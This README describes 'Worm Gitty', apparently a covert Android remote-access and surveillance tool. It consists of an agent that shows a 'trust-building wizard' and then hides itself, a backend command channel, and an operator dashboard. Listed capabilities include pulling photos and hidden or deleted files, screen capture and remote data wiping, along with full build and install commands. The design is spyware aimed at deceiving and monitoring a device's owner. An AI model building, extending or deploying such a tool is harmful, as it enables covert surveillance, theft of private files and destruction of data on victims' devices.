# Worm Gitty

Local-first device agent + operator dashboard. Android presents a short
trust-building wizard, then hides; all operational controls live in the
`panel/` dashboard routed through `backend/`.

## Layout

| Dir | Stack | Purpose |
|-----|-------|---------|
| `android/` | Kotlin, Compose M3, Room, WorkManager | Agent: wizard → hide → heartbeat + command channel (SSE + 15 s poll fallback) |
| `backend/` | Fastify + Prisma + Postgres | Auth (user 2FA + device credential), commands, photo inventory, file drop |
| `panel/` | Vite + Alpine | Login → 2FA → device list/detail → ordered actions |
| `contract/` | markdown | API contracts (needs-panel / needs-android) |

## Run

```bash
# backend (Postgres container + API on :3000)
cd backend && docker compose up -d && npm i && npx prisma migrate deploy && npm run dev

# panel (Vite on :5173, proxies /api → :3000)
cd panel && npm i && VITE_USE_BACKEND=true npm run dev

# android
cd android && ./gradlew assembleDebug && adb install app/build/outputs/apk/debug/app-debug.apk
```

## Credentials

Defaults live in `backend/.env` (never commit real secrets):

- `PANEL_ADMIN_USER` / `PANEL_ADMIN_PASS` — dashboard login
- `PANEL_2FA_CODE` — second-factor code (login → ticket → `/auth/2fa`)

## Tests

```bash
cd android && ./gradlew testDebugUnitTest && ./gradlew lintDebug
cd backend && npm test
cd panel && npm test
```

## Artifacts

Pulled artifacts land in `D:\Dashboard Panel\{deviceId}\{category}\{ts}_{name}`
(`PANEL_DROP_DIR` env var overrides). Categories: `original`, `hidden`,
`deleted`. SHA-256 dedup — identical content is never written twice.

## Limitations

See `STATE.md` — SSE is used instead of a raw WebSocket; emulator `wipeData`
doesn't reboot-recover on AVDs; `screen_capture` needs a consent token;
`.nomedia` hidden detection needs the DATA column (pre-scoped-storage).
